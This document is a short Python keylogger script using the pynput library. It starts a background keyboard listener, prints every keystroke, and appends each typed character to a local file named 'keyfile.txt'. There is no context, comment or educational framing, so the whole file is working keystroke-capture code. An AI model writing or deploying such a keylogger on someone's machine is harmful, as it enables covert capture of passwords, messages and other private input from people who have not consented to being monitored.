from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", "a") as logKey:
        try:
            keyInput = key.char
            logKey.write(keyInput + "\n")
        except:
            print('Error getting char')

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
